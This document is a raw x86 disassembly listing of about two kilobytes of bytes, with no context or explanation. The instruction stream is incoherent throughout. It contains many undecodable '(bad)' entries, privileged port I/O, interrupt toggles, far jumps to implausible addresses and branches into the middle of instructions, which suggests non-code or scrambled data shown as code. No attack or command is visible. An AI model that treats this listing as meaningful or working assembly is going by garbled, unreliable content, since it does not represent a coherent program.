  4165b2:	mov    edi,edx
  4165b4:	adc    ch,0x44
  4165b7:	jb     0x416629
  4165b9:	fadd   DWORD PTR [eax-0x61]
  4165bc:	jle    0x4165b7
  4165be:	pop    ecx
  4165bf:	repz inc edx
  4165c1:	ja     0x416549
  4165c3:	mov    cl,0x39
  4165c5:	add    al,0xbb
  4165c7:	lods   al,BYTE PTR ds:[esi]
  4165c8:	test   BYTE PTR [eax+0x65010b11],dl
  4165ce:	mov    ah,0x34
  4165d0:	test   eax,0x6b5c9c10
  4165d5:	out    dx,ax
  4165d7:	out    0x3b,eax
  4165d9:	out    0xf6,eax
  4165db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165dc:	leave  
  4165dd:	sub    ebx,ebp
  4165df:	(bad)  
  4165e0:	std    
  4165e1:	popf   
  4165e2:	mov    ch,0x88
  4165e4:	and    eax,0x7f2d0e07
  4165e9:	cli    
  4165ea:	test   al,0x69
  4165ec:	mov    bl,0xf9
  4165ee:	xlat   BYTE PTR ds:[ebx]
  4165ef:	mov    BYTE PTR [ebp-0x74],bl
  4165f2:	sbb    esi,DWORD PTR [esi]
  4165f4:	or     BYTE PTR [ebx+0x4a],dh
  4165f7:	cs sbb al,0xac
  4165fa:	adc    BYTE PTR [ebx-0x7c],dh
  4165fd:	and    esp,edi
  4165ff:	push   es
  416600:	push   es
  416601:	cmp    BYTE PTR [ebx],al
  416603:	pop    eax
  416604:	pop    edi
  416605:	xor    DWORD PTR [bx+di+0x1318],ebx
  41660a:	push   edx
  41660b:	sub    DWORD PTR [ebp+0x58],0xffffffe5
  41660f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416610:	sbb    edx,DWORD PTR [edi]
  416612:	pop    eax
  416613:	fstp   QWORD PTR [ebp+0x4f918b84]
  416619:	out    0x4,eax
  41661b:	out    dx,al
  41661c:	push   ds
  41661d:	add    al,0xb0
  41661f:	sbb    eax,0xa770a3e0
  416624:	fdivr  QWORD PTR [ebx+esi*4+0x69]
  416628:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41662a:	cmp    DWORD PTR [esi+0x69],edi
  41662d:	sbb    DWORD PTR [edi+0x19],ecx
  416630:	pop    ss
  416631:	pop    ebp
  416632:	mov    edi,0x9c44cf0e
  416637:	sbb    BYTE PTR [esp+ebx*8],dh
  41663a:	lds    esi,FWORD PTR [ebp+eax*8-0x80]
  41663e:	clc    
  41663f:	jns    0x416674
  416641:	fwait
  416642:	js     0x416699
  416644:	addr16 sbb esp,edx
  416647:	push   0xd17d2fb
  41664c:	mov    ah,0x7d
  41664e:	in     al,dx
  41664f:	mov    ebp,0xf37e64d6
  416654:	inc    ecx
  416655:	adc    DWORD PTR [edi+0x7a],0xedd59184
  41665c:	mov    eax,ds:0x9048359f
  416661:	xchg   edx,eax
  416662:	xchg   DWORD PTR [esi+0x43b24570],edx
  416668:	stc    
  416669:	sub    BYTE PTR ds:0x11d48a83,dh
  41666f:	push   0x32
  416671:	cmp    BYTE PTR [ebp-0x5b],0xc1
  416675:	out    dx,al
  416676:	stc    
  416677:	adc    bl,BYTE PTR [ebx+0x58b9e9d7]
  41667d:	rcl    BYTE PTR [esi-0x45cb76e],cl
  416683:	jne    0x41669a
  416685:	aaa    
  416686:	jecxz  0x4166d5
  416688:	mov    dh,ch
  41668a:	outs   dx,BYTE PTR ds:[esi]
  41668b:	mov    eax,esi
  41668d:	test   eax,0xed073319
  416692:	(bad)  
  416693:	xor    DWORD PTR [ebp+0x2d],ebp
  416696:	repnz xor DWORD PTR [ebx],0xffffffa0
  41669a:	shl    BYTE PTR [ebp+0x28],0xe
  41669e:	push   edx
  41669f:	and    dl,ah
  4166a1:	adc    esp,0xb0448625
  4166a7:	scas   al,BYTE PTR es:[edi]
  4166a8:	jmp    0x8e9900d8
  4166ad:	je     0x41668a
  4166af:	sbb    DWORD PTR [ebx-0x61b84a93],edi
  4166b5:	in     al,0x8e
  4166b7:	lea    edx,[ebp-0x3e]
  4166ba:	repz jno 0x4166a7
  4166bd:	in     eax,0xe9
  4166bf:	mov    cl,0xbe
  4166c1:	xor    ecx,esi
  4166c3:	jg     0x4166c1
  4166c5:	sub    ch,BYTE PTR [ecx+edi*1-0x62cfec7b]
  4166cc:	aam    0xdd
  4166ce:	lahf   
  4166cf:	lahf   
  4166d0:	add    esp,DWORD PTR [ebp-0x73ddeeea]
  4166d6:	imul   esp,DWORD PTR [edi],0x49
  4166d9:	(bad)  
  4166da:	nop
  4166db:	in     al,dx
  4166dc:	mov    ds:0xbea6a833,eax
  4166e1:	adc    ch,ch
  4166e3:	push   ecx
  4166e4:	pop    esi
  4166e5:	mov    bl,BYTE PTR [ebp+0x64]
  4166e8:	(bad)
  4166eb:	stos   DWORD PTR es:[edi],eax
  4166ec:	aad    0x4e
  4166ee:	xchg   edi,eax
  4166ef:	mov    bl,0x61
  4166f1:	cmp    eax,0x2fd2ddcf
  4166f6:	fprem  
  4166f8:	cmp    eax,0x8d5ed22d
  4166fd:	out    dx,al
  4166fe:	jmp    0x41668a
  416700:	inc    eax
  416701:	push   ss
  416702:	mov    al,ds:0xbbbe72a2
  416707:	jnp    0x41671f
  416709:	fld    DWORD PTR [edx-0x81e920]
  41670f:	sbb    eax,0x5ec1e23e
  416714:	add    DWORD PTR [edx+0x7b],0xa9e85858
  41671b:	mov    cl,0x24
  41671d:	cmp    DWORD PTR [esi+0xdc109f2],ebx
  416723:	pop    ecx
  416724:	fmul   st(0),st
  416726:	std    
  416727:	in     eax,dx
  416728:	or     dl,0x64
  41672b:	dec    ebx
  41672c:	dec    eax
  41672d:	push   0xffffff85
  41672f:	fisub  DWORD PTR [edx-0x21]
  416732:	cmp    cl,BYTE PTR ds:0xa64679b6
  416738:	sub    DWORD PTR [edi],edx
  41673a:	jecxz  0x41677d
  41673c:	loopne 0x416764
  41673e:	stos   BYTE PTR es:[edi],al
  41673f:	push   edx
  416740:	pop    es
  416741:	sub    eax,0x3803dda5
  416746:	scas   eax,DWORD PTR es:[edi]
  416747:	and    DWORD PTR [ebx+0x2c],ebx
  41674a:	stos   BYTE PTR es:[edi],al
  41674b:	nop
  41674c:	push   edx
  41674d:	scas   eax,DWORD PTR es:[edi]
  41674e:	mov    ebx,0x63c2f036
  416753:	sbb    DWORD PTR [ebx],edx
  416755:	dec    ecx
  416756:	jle    0x41679f
  416758:	cmp    al,0x1f
  41675a:	pop    eax
  41675b:	sbb    DWORD PTR [edx-0x74cd8554],eax
  416761:	stos   DWORD PTR es:[edi],eax
  416762:	dec    esi
  416764:	inc    ecx
  416765:	jecxz  0x4167dd
  416767:	dec    esp
  416768:	aad    0xd8
  41676a:	(bad)  
  41676b:	call   0xace:0xe482c4bf
  416772:	add    dl,BYTE PTR [ecx-0x77]
  416775:	mov    eax,ds:0xc5e0d737
  41677a:	addr16 push cs
  41677c:	stos   DWORD PTR es:[edi],eax
  41677d:	stos   DWORD PTR es:[edi],eax
  41677e:	fwait
  41677f:	(bad)  
  416780:	mov    al,ds:0x34b029e7
  416785:	push   0xfc6b801a
  41678a:	and    DWORD PTR [ebp+0x14],edx
  41678d:	fptan  
  41678f:	aad    0x62
  416791:	div    DWORD PTR [edi+0x14]
  416794:	xchg   ebx,eax
  416795:	jno    0x4167e7
  416797:	js     0x4167eb
  416799:	mov    edi,0x5206aac5
  41679e:	adc    dh,BYTE PTR [edi]
  4167a0:	inc    esi
  4167a1:	shl    DWORD PTR [ecx+0x42],1
  4167a4:	push   es
  4167a5:	test   ch,cl
  4167a7:	push   eax
  4167a8:	adc    ch,BYTE PTR [ebx]
  4167aa:	adc    DWORD PTR [edx],ebx
  4167ac:	dec    edx
  4167ad:	mov    cl,0x56
  4167af:	nop
  4167b0:	(bad)  
  4167b1:	(bad)  
  4167b2:	sar    edx,cl
  4167b4:	xor    esi,DWORD PTR [eax+0x35]
  4167b7:	and    eax,DWORD PTR [ecx+0x29]
  4167ba:	xchg   edi,eax
  4167bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167bc:	pop    ds
  4167bd:	test   eax,0xac4a619c
  4167c2:	ss push ds
  4167c4:	fisubr WORD PTR cs:[ebx+0x6be0d9a3]
  4167cb:	and    esp,DWORD PTR [esi]
  4167cd:	mov    ah,BYTE PTR [esi+eiz*8-0x6de14769]
  4167d4:	stos   DWORD PTR es:[edi],eax
  4167d5:	cld    
  4167d6:	mov    ebx,0x191ffef7
  4167db:	and    DWORD PTR [edi+0x4d709fa9],ebx
  4167e1:	adc    DWORD PTR [eax+0x50],ebx
  4167e4:	imul   ebp,DWORD PTR [edi+0x4b0abd85],0x3
  4167eb:	scas   eax,DWORD PTR es:[edi]
  4167ec:	data16 fmul DWORD PTR [eax-0x5e]
  4167f0:	push   cs
  4167f1:	shr    BYTE PTR [esi],1
  4167f3:	jg     0x41677f
  4167f5:	xchg   BYTE PTR [edx+eax*2-0x3e8c9a0f],dh
  4167fc:	(bad)  
  4167fe:	and    cl,dh
  416800:	jl     0x416827
  416802:	pop    DWORD PTR [ecx-0x5af11b0c]
  416808:	stos   BYTE PTR es:[edi],al
  416809:	sbb    al,0x2c
  41680b:	mov    BYTE PTR ds:0x33f83e8c,0x5c
  416812:	lock in eax,dx
  416814:	inc    ecx
  416815:	mov    cl,0xa1
  416817:	aas    
  416818:	mov    ch,0x5f
  41681a:	ss not bl
  41681d:	pop    edi
  41681e:	mov    ?,WORD PTR [edi]
  416820:	mov    al,0x55
  416822:	test   esp,esp
  416824:	push   eax
  416825:	mov    WORD PTR [edx+0x1e],gs
  416828:	(bad)  
  416829:	retf   
  41682a:	push   ecx
  41682b:	sar    BYTE PTR [eax],1
  41682d:	stc    
  41682e:	aaa    
  41682f:	pop    ebx
  416830:	mov    gs,WORD PTR [eax]
  416832:	pop    ss
  416833:	xchg   ebp,eax
  416834:	add    dl,BYTE PTR [esi-0x937273c]
  41683a:	jae    0x41683c
  41683c:	pushf  
  41683d:	pop    esi
  41683e:	ror    BYTE PTR [ecx-0x7c],1
  416841:	retf   0x8e9a
  416844:	sub    eax,0x7e36e23a
  416849:	xor    bl,BYTE PTR [edx+0x33d7ffab]
  41684f:	mov    edi,0x65fb33e5
  416854:	pop    ebp
  416855:	sti    
  416856:	adc    eax,0x11db3071
  41685b:	add    esp,DWORD PTR [eax]
  41685d:	(bad)  
  41685e:	fidiv  WORD PTR [ecx-0x3f]
  416861:	add    eax,0xad88b0a5
  416866:	xchg   dx,ax
  416868:	mov    dh,BYTE PTR [edi-0x1b48d5a0]
  41686e:	add    al,0x3b
  416871:	dec    eax
  416872:	div    DWORD PTR [eax-0x7ea59dff]
  416878:	xlat   BYTE PTR ds:[ebx]
  416879:	ins    DWORD PTR es:[edi],dx
  41687a:	adc    eax,0x75498b65
  41687f:	cmp    esp,ebp
  416881:	jl     0x41684f
  416883:	clc    
  416884:	xor    bl,BYTE PTR [ebx+0x30]
  416887:	fcmovne st,st(7)
  416889:	jo     0x41681b
  41688b:	adc    al,0x5d
  41688d:	lea    eax,[edi]
  41688f:	adc    cl,ch
  416891:	and    DWORD PTR [ecx],esi
  416893:	mov    esp,DWORD PTR [edx-0x1]
  416896:	shr    BYTE PTR [ebx+edx*1+0x42],cl
  41689a:	and    al,0x79
  41689c:	mov    ah,0x14
  41689e:	aas    
  41689f:	mov    al,0x6f
  4168a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168a2:	inc    ebp
  4168a3:	push   ebp
  4168a4:	fist   DWORD PTR [eax]
  4168a6:	test   ebx,edi
  4168a8:	int3   
  4168a9:	out    dx,al
  4168aa:	(bad)  
  4168ab:	push   cs
  4168ac:	dec    ebp
  4168ad:	test   eax,0xa64cefdd
  4168b2:	fimul  DWORD PTR [esi]
  4168b4:	mov    gs,WORD PTR [ebx-0xd0e5665]
  4168ba:	mov    eax,ds:0x20c89bbf
  4168bf:	or     al,bh
  4168c1:	sahf   
  4168c2:	or     al,0x5f
  4168c4:	mov    eax,edi
  4168c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168c7:	dec    edi
  4168c8:	bound  esi,QWORD PTR [ecx]
  4168ca:	das    
  4168cb:	jge    0x4168e2
  4168cd:	ffreep st(0)
  4168cf:	shr    BYTE PTR [esi-0x6de09b2c],0xfc
  4168d6:	in     al,0x27
  4168d8:	scas   al,BYTE PTR es:[edi]
  4168d9:	push   ss
  4168da:	cmp    bl,BYTE PTR [ecx+eiz*1+0x70f30023]
  4168e1:	add    bl,ah
  4168e3:	sti    
  4168e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168e5:	push   0xffffffa4
  4168e7:	sub    eax,0x7b9b5bb0
  4168ec:	ins    DWORD PTR es:[edi],dx
  4168ed:	aad    0x7c
  4168ef:	sub    DWORD PTR [edi+0x332c43d7],ecx
  4168f5:	fcom   QWORD PTR [esi+edi*2-0x1]
  4168f9:	shl    ch,cl
  4168fb:	call   0xcc06eea5
  416900:	xor    al,0xdd
  416902:	test   ch,bl
  416904:	push   ds
  416905:	inc    edx
  416906:	adc    al,0xbf
  416908:	lods   eax,DWORD PTR ds:[esi]
  416909:	out    0x3b,eax
  41690b:	or     eax,0x4c40c381
  416910:	sub    dl,BYTE PTR [ecx+0x4c5e316c]
  416916:	pushf  
  416917:	fmul   QWORD PTR [edi]
  416919:	je     0x4168e8
  41691b:	lock push es
  41691d:	mov    esi,0x81309922
  416922:	push   edi
  416923:	daa    
  416924:	repnz (bad) 
  416926:	pop    edi
  416927:	add    cl,ch
  416929:	fcom   DWORD PTR [ecx]
  41692b:	sbb    eax,0xd2ccea5b
  416930:	ret    0x243a
  416933:	mov    ch,0xf
  416935:	loope  0x41697d
  416937:	stc    
  416938:	mov    WORD PTR [ecx+0x347c0443],?
  41693e:	fsub   DWORD PTR [ebx]
  416940:	jns    0x4169a8
  416942:	(bad)  
  416943:	out    dx,eax
  416944:	sub    ebp,DWORD PTR [edi+0x2b]
  416947:	imul   edx,DWORD PTR [bx+si-0x41],0xb11f34d8
  41694f:	sbb    ecx,ecx
  416951:	pop    ss
  416952:	pushf  
  416953:	leave  
  416954:	dec    ebx
  416955:	(bad)  
  416956:	call   DWORD PTR [eax]
  416958:	out    dx,al
  416959:	xor    eax,0xd7f5ba5
  41695e:	and    BYTE PTR [edx],bl
  416960:	daa    
  416961:	iret   
  416962:	shl    edx,cl
  416964:	mov    cl,0x78
  416966:	mov    esi,0xb0f77ef2
  41696b:	loop   0x416916
  41696d:	lods   al,BYTE PTR ds:[esi]
  41696e:	sub    bh,BYTE PTR [bp+di+0x22]
  416972:	in     al,dx
  416973:	xor    eax,0xa830d983
  416978:	jae    0x416903
  41697a:	test   BYTE PTR [ecx+eiz*8],0x91
  41697e:	imul   esi,DWORD PTR ds:0xf5b49012,0x3a
  416985:	setno  BYTE PTR [eax+edx*8]
  416989:	adc    ebp,DWORD PTR [edx]
  41698b:	mov    ebp,0x37e2ef4f
  416990:	(bad)  
  416991:	push   eax
  416992:	(bad)  
  416993:	mov    bl,0x88
  416995:	xor    cl,BYTE PTR [ebx]
  416997:	sub    BYTE PTR [ebp+0x39],ch
  41699a:	xchg   ecx,eax
  41699b:	call   0xfe40:0xf6629e16
  4169a2:	cmp    BYTE PTR [esi],dh
  4169a4:	mov    ds,WORD PTR [edi+0x1cbdefec]
  4169aa:	and    ecx,DWORD PTR [ecx]
  4169ac:	mov    eax,ds:0x950eebb3
  4169b1:	inc    edi
  4169b2:	xchg   BYTE PTR [esi-0x34],cl
  4169b5:	shl    DWORD PTR [ebp+esi*2+0x407781f0],1
  4169bc:	mov    esp,0xa85b6c45
  4169c1:	scas   al,BYTE PTR es:[edi]
  4169c2:	jg     0x416a09
  4169c4:	inc    ebx
  4169c5:	mov    ebp,DWORD PTR [eiz*2-0x36829487]
  4169cc:	and    eax,0xca38b84d
  4169d1:	xchg   ecx,eax
  4169d2:	push   cs
  4169d3:	cmp    ebx,ecx
  4169d5:	xor    DWORD PTR [edi+0x70f6359d],0xffffffac
  4169dc:	push   esp
  4169dd:	inc    esi
  4169de:	sub    eax,0xe68ebecc
  4169e3:	add    dh,bl
  4169e5:	jb     0x416977
  4169e7:	ins    DWORD PTR es:[edi],dx
  4169e8:	jg     0x4169d2
  4169ea:	inc    edi
  4169eb:	dec    edi
  4169ec:	fld    TBYTE PTR [eax-0x61]
  4169ef:	sbb    eax,0x8489f398
  4169f4:	cvtpi2ps xmm1,mm4
  4169f7:	mov    dl,0x11
  4169f9:	mov    fs,WORD PTR ds:0xd5971a40
  4169ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a00:	out    0x47,eax
  416a02:	inc    eax
  416a03:	rcr    BYTE PTR [esi-0x1f8b1cc1],cl
  416a09:	dec    esp
  416a0a:	jge    0x4169ad
  416a0c:	pop    ds
  416a0d:	inc    esi
  416a0e:	in     eax,0x25
  416a10:	or     al,0xb6
  416a12:	inc    ecx
  416a13:	jns    0x416a70
  416a15:	jmp    0x2362:0xecb7b59b
  416a1c:	jb     0x416a62
  416a1e:	mov    bh,0x5d
  416a20:	mov    ecx,0xcc447d0a
  416a25:	and    eax,0x191308df
  416a2a:	out    0xad,al
  416a2c:	xchg   DWORD PTR [edx+0x2a],esp
  416a2f:	mov    esi,0x6d57fe7f
  416a34:	jnp    0x416aa7
  416a36:	mov    ebp,0x6f65f2a7
  416a3b:	dec    ebx
  416a3c:	repz xor eax,0x67f48513
  416a42:	ror    bl,1
  416a44:	rcl    bh,0x7b
  416a47:	mov    ah,0x29
  416a49:	mov    ebp,0x432623b6
  416a4e:	mov    edi,0x64929f8
  416a53:	mov    ebp,0x47817ab3
  416a58:	popa   
  416a59:	(bad)  
  416a5b:	cmp    DWORD PTR [ebp+0x7b],edx
  416a5e:	in     eax,dx
  416a5f:	call   0x8be06556
  416a64:	dec    eax
  416a65:	test   DWORD PTR ds:0x49cb61b9,esp
  416a6b:	sub    al,0x95
  416a6d:	scas   eax,DWORD PTR es:[edi]
  416a6e:	pop    ebx
  416a6f:	rcl    edi,0xf7
  416a72:	lea    eax,[ebx]
  416a74:	scas   eax,DWORD PTR es:[edi]
  416a75:	xor    esi,esp
  416a77:	aas    
  416a78:	push   ss
  416a79:	push   ss
  416a7a:	hlt    
  416a7b:	retf   0xf878
  416a7e:	in     al,0x41
  416a80:	rcl    BYTE PTR [esi+0x4f55cc87],1
  416a86:	test   al,0xfe
  416a88:	and    eax,0xa53fb3d6
  416a8d:	iret   
  416a8e:	adc    esi,esp
  416a90:	jo     0x416a9b
  416a92:	mov    cl,0x29
  416a94:	ins    BYTE PTR es:[edi],dx
  416a95:	les    eax,FWORD PTR [ecx]
  416a97:	or     eax,0x7097524d
  416a9c:	mov    ch,0x22
  416a9e:	call   FWORD PTR [ecx-0x5c7b06d4]
  416aa4:	sbb    DWORD PTR [esi],0x63
  416aa7:	leave  
  416aa8:	lds    edx,FWORD PTR [ebx+0x40]
  416aab:	addr16 (bad) 
  416aad:	cld    
  416aae:	test   DWORD PTR [ebp+0x11faae3e],ecx
  416ab4:	hlt    
  416ab5:	out    0x9a,al
  416ab7:	ret    0xc10
  416aba:	test   al,0x8c
  416abc:	cmp    edx,DWORD PTR [ebp+0x22]
  416abf:	retf   
  416ac0:	pop    es
  416ac1:	cdq    
  416ac2:	push   0x96766ec
  416ac7:	jg     0x416ada
  416ac9:	push   edx
  416aca:	push   esp
  416acb:	and    eax,0x8587b59b
  416ad0:	pop    esi
  416ad1:	(bad)  
  416ad2:	loop   0x416a72
  416ad4:	imul   esi,DWORD PTR [edx-0x396d547f],0x6758211c
  416ade:	xchg   ecx,eax
  416adf:	inc    edi
  416ae0:	aad    0x44
  416ae2:	and    eax,0x938cb2f8
  416ae7:	push   ebx
  416ae8:	dec    esp
  416ae9:	xchg   edi,eax
  416aea:	cmp    BYTE PTR [edi-0x13ba8a96],bh
  416af0:	mov    ebp,edi
  416af2:	daa    
  416af3:	fcom   DWORD PTR [ebx-0x6eb5cfe7]
  416af9:	or     al,0x80
  416afb:	aad    0x94
  416afd:	inc    eax
  416afe:	in     al,0xb5
  416b00:	out    0x78,eax
  416b02:	mov    dh,0xbd
  416b04:	out    0x28,al
  416b06:	imul   esp,DWORD PTR [edi+0x9],0xffffffda
  416b0a:	push   cs
  416b0b:	and    ecx,DWORD PTR [ecx]
  416b0d:	mov    DWORD PTR [ebp+0x5492c6e3],0x19207720
  416b17:	mov    eax,DWORD PTR [eax-0x149a0134]
  416b1d:	out    dx,eax
  416b1e:	sbb    cl,dh
  416b20:	cld    
  416b21:	lahf   
  416b22:	sub    DWORD PTR [esi-0x21774317],ebx
  416b28:	dec    esp
  416b29:	stos   DWORD PTR es:[edi],eax
  416b2a:	mov    ecx,0x728c3061
  416b2f:	push   0x40
  416b31:	in     eax,dx
  416b32:	xchg   esi,eax
  416b33:	loope  0x416ba9
  416b35:	fwait
  416b36:	dec    edx
  416b37:	test   BYTE PTR [edx+0x4c],dl
  416b3a:	pop    ebp
  416b3b:	xlat   BYTE PTR ds:[ebx]
  416b3c:	xchg   ecx,eax
  416b3d:	pop    edx
  416b3e:	retf   0x7efe
  416b41:	dec    esi
  416b42:	fwait
  416b43:	inc    ebx
  416b44:	daa    
  416b45:	test   cl,al
  416b47:	pop    ecx
  416b48:	sbb    cl,bh
  416b4a:	mul    BYTE PTR [edx+0x4]
  416b4d:	in     eax,0xf2
  416b4f:	xchg   BYTE PTR [edx-0x796c364e],bh
  416b55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b56:	repz lea eax,[ebx+0x62465757]
  416b5d:	jns    0x416b82
  416b5f:	jmp    0x416b2a
  416b61:	push   ds
  416b62:	ins    DWORD PTR es:[edi],dx
  416b63:	xor    esi,DWORD PTR [edx-0x6e]
  416b66:	int3   
  416b67:	sbb    al,0x6d
  416b69:	retf   
  416b6a:	push   edi
  416b6b:	loope  0x416b3c
  416b6d:	and    BYTE PTR [eax+ebx*8],dl
  416b70:	jmp    0x70e1f9b4
  416b75:	ja     0x416bdf
  416b77:	add    eax,0x3e5f10cb
  416b7c:	inc    esp
  416b7d:	adc    al,0xb0
  416b7f:	in     al,0x65
  416b81:	or     cl,dh
  416b83:	dec    esp
  416b84:	mov    edi,0x6f99b1b6
  416b89:	inc    esi
  416b8a:	test   eax,0x2ead0891
  416b8f:	popa   
  416b90:	pop    ebp
  416b91:	out    dx,al
  416b92:	pop    edx
  416b93:	mov    edi,0xbfa6a07
  416b98:	leave  
  416b99:	add    ebx,DWORD PTR [ebx+0x3aacc04e]
  416b9f:	ins    BYTE PTR es:[edi],dx
  416ba0:	jno    0x416c0a
  416ba2:	pop    ds
  416ba3:	add    DWORD PTR [esi+0x4f6d0e9f],esp
  416ba9:	mov    BYTE PTR [ecx+0x7b9c8976],dh
  416baf:	cdq    
  416bb0:	inc    edi
  416bb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bb2:	push   eax
  416bb3:	(bad)  
  416bb4:	jp     0x416b98
  416bb6:	mov    ebp,0xdbbee02f
  416bbb:	mov    ecx,0xa146bad7
  416bc0:	sbb    al,0xaa
  416bc2:	inc    ebp
  416bc3:	sub    BYTE PTR [ecx-0x54222366],0x75
  416bca:	loop   0x416ba9
  416bcc:	add    al,0x95
  416bce:	dec    eax
  416bcf:	cmp    esp,edx
  416bd1:	ret    0x8336
  416bd4:	out    dx,al
  416bd5:	and    al,0xca
  416bd7:	pop    edx
  416bd8:	scas   al,BYTE PTR es:[edi]
  416bd9:	scas   eax,DWORD PTR es:[edi]
  416bda:	mov    ebx,0x2008bbb8
  416bdf:	sbb    eax,0xf67c3892
  416be4:	aad    0x13
  416be6:	or     ax,0x8b74
  416bea:	xchg   esp,eax
  416beb:	int    0x78
  416bed:	jmp    0x8817e3b1
  416bf2:	cmp    ebp,edi
  416bf4:	mov    al,BYTE PTR [ebx-0x3ff590d9]
  416bfa:	xchg   ebx,eax
  416bfb:	xchg   ebp,eax
  416bfc:	add    DWORD PTR [ecx+eiz*1-0x3c],eax
  416c00:	mov    dl,0xc9
  416c02:	loopne 0x416c15
  416c04:	test   eax,0x1e6a0c8e
  416c09:	sub    al,BYTE PTR [edi-0x68]
  416c0c:	mov    dl,0xa1
  416c0e:	(bad)  
  416c0f:	or     ah,BYTE PTR [ebx]
  416c11:	and    eax,0xc723fac4
  416c16:	int3   
  416c17:	loope  0x416c22
  416c19:	mov    ebx,0xec122ec2
  416c1e:	jecxz  0x416bcc
  416c20:	cld    
  416c21:	loop   0x416c06
  416c23:	inc    ecx
  416c24:	add    al,0x94
  416c26:	jge    0x416c94
  416c28:	fwait
  416c29:	xchg   edi,eax
  416c2a:	dec    esp
  416c2b:	fs xchg ebx,eax
  416c2d:	mov    al,ds:0x3e73bd8e
  416c32:	cmp    DWORD PTR [ecx+0x45888562],esi
  416c38:	jno    0x416c0b
  416c3a:	xor    bl,BYTE PTR [esi-0x3be0ece8]
  416c40:	ins    DWORD PTR es:[edi],dx
  416c41:	adc    ebx,DWORD PTR [esi]
  416c43:	gs das 
  416c45:	xchg   esi,eax
  416c46:	push   edi
  416c47:	ins    BYTE PTR es:[edi],dx
  416c48:	lahf   
  416c49:	cli    
  416c4a:	pop    ds
  416c4b:	stc    
  416c4c:	mov    ah,0xf
  416c4e:	ja     0x416bdf
  416c50:	pop    ss
  416c51:	dec    ecx
  416c52:	cwde   
  416c53:	inc    esp
  416c54:	dec    esi
  416c55:	jae    0x416bfc
  416c57:	in     al,dx
  416c58:	nop
  416c59:	or     eax,0xbeb50c22
  416c5e:	ja     0x416c05
  416c60:	pop    ds
  416c61:	jmp    0x1eb4:0x232a8014
  416c68:	fwait
  416c69:	pop    eax
  416c6a:	inc    ebp
  416c6b:	pop    ebp
  416c6c:	xchg   ecx,eax
  416c6d:	dec    eax
  416c6e:	std    
  416c6f:	jbe    0x416c3a
  416c71:	cmp    BYTE PTR [edx],ah
  416c73:	jbe    0x416c26
  416c75:	push   es
  416c76:	mov    dh,0x5f
  416c78:	hlt    
  416c79:	jl     0x416c71
  416c7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c7c:	leave  
  416c7d:	rcl    dl,1
  416c7f:	leave  
  416c80:	fwait
  416c81:	popf   
  416c82:	sbb    edi,DWORD PTR [ecx]
  416c84:	mov    dh,0x3e
  416c86:	ficom  DWORD PTR [edx]
  416c88:	(bad)  
  416c8a:	ss mov ebx,0xbd890901
  416c90:	imul   edi,esi,0x3daea2cf
  416c96:	and    al,0xa8
  416c98:	add    BYTE PTR [eax],cl
  416c9a:	cmp    ch,BYTE PTR [ebx-0xa56926f]
  416ca0:	xor    eax,0x121ed16a
  416ca5:	leave  
  416ca6:	cmp    DWORD PTR cs:[ecx],ebp
  416ca9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416caa:	(bad)  
  416cab:	lods   eax,DWORD PTR ds:[esi]
  416cac:	mov    al,0xe2
  416cae:	and    eax,0x4d945e9e
  416cb3:	adc    al,bl
  416cb5:	pop    esp
  416cb6:	idiv   DWORD PTR [ecx+esi*8-0x5e]
  416cba:	cmp    DWORD PTR [ebx-0x40f33297],0xd5ce01eb
  416cc4:	inc    edi
  416cc5:	les    edx,FWORD PTR [edi]
  416cc7:	inc    ebx
  416cc8:	and    eax,0x21971491
  416ccd:	gs pop ds
  416ccf:	mov    bh,BYTE PTR [esp+edx*4+0x38]
  416cd3:	xlat   BYTE PTR ds:[ebx]
  416cd4:	ror    DWORD PTR [ebp-0x5],1
  416cd7:	in     eax,0xc3
  416cd9:	inc    eax
  416cda:	cmp    dl,BYTE PTR [esi+0x77]
  416cdd:	in     al,0x45
  416cdf:	enter  0x9aca,0xa8
  416ce3:	outs   dx,BYTE PTR ds:[esi]
  416ce4:	pusha  
  416ce5:	clc    
  416ce6:	popa   
  416ce7:	add    edi,ebx
  416ce9:	jmp    0x719cdff1
  416cee:	out    0x14,al
  416cf0:	scas   al,BYTE PTR es:[edi]
  416cf1:	jno    0x416d3f
  416cf3:	xor    DWORD PTR [edi-0x19],ecx
  416cf6:	jge    0x416c87
  416cf8:	pop    eax
  416cf9:	cmp    cl,dl
  416cfb:	xlat   BYTE PTR ds:[ebx]
  416cfc:	inc    esp
  416cfd:	(bad)  
  416cfe:	push   0xe3a55c8a
  416d03:	inc    eax
  416d04:	pop    edx
  416d05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d06:	pusha  
  416d07:	cmc    
  416d08:	mov    DWORD PTR [esi+esi*8],esi
  416d0b:	mov    bl,0x92
  416d0d:	push   ecx
  416d0e:	add    DWORD PTR [eax+ebx*2-0x60],ebx
  416d12:	xchg   ebp,eax
  416d13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d14:	dec    edi
  416d15:	or     ecx,0x5962e29b
  416d1b:	inc    ebx
  416d1c:	push   0x6206690
  416d21:	or     cl,BYTE PTR [edx+0x6c56edbd]
  416d27:	mov    dl,0x55
  416d29:	lds    edx,FWORD PTR [ecx-0x30]
  416d2c:	enter  0x21a5,0x84
  416d30:	mov    bh,0x75
  416d32:	sub    BYTE PTR [edi+0x8],cl
  416d35:	xchg   ebx,eax
  416d36:	xchg   edi,eax
  416d37:	retf   
  416d38:	xlat   BYTE PTR ds:[ebx]
  416d39:	(bad)  [ebx]
  416d3b:	int3   
  416d3c:	pop    es
  416d3d:	add    al,0x77
  416d3f:	xlat   BYTE PTR ds:[ebx]
  416d40:	stc    
  416d41:	(bad)  
  416d42:	hlt    
  416d43:	mul    DWORD PTR [ebp+0x5e83fcbb]
  416d49:	ss dec edi
  416d4b:	cs inc edx
  416d4d:	lock push ds
  416d4f:	xor    ebp,ecx
